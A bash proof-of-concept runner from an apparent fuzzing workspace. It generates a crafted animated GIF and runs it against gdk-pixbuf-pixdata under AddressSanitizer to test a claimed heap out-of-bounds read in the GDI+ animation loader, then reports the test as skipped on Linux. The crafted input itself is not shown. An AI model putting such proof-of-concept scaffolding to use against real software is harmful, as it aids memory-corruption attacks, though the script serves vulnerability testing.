#!/bin/bash
# PoC runner for VULN 001:
# Heap Out-of-Bounds Read via Inflated item_count in gdip_bitmap_get_frame_delay
#
# NOTE: This vulnerability requires GDI+ (Windows-only). On this Linux build,
# gdk-pixbuf-pixdata only supports the pixdata format and has no GIF loader.
# The script still runs to document the expected behavior.

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/gdk-pixbuf/gdk-pixbuf_io-gdip-animation_c"
BINARY="/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata"

echo "[*] Generating crafted animated GIF..."
python3 "$POC_DIR/vuln_001_gen.py"

echo "[*] Running gdk-pixbuf-pixdata against the crafted GIF..."
ASAN_OPTIONS="abort_on_error=0:log_path=$POC_DIR/asan.log" \
  "$BINARY" "$POC_DIR/vuln_001.gif" "$POC_DIR/vuln_001_out.c" \
  > "$POC_DIR/vuln_001_result.txt" 2>&1 || true

echo "[*] Result:"
cat "$POC_DIR/vuln_001_result.txt"
echo ""
echo "[!] Expected: 'Couldn't recognize the image file format' (no GIF/GDI+ loader on Linux)"
echo "[!] VULN 001 status: SKIPPED (platform limitation - requires Windows + GDI+)"
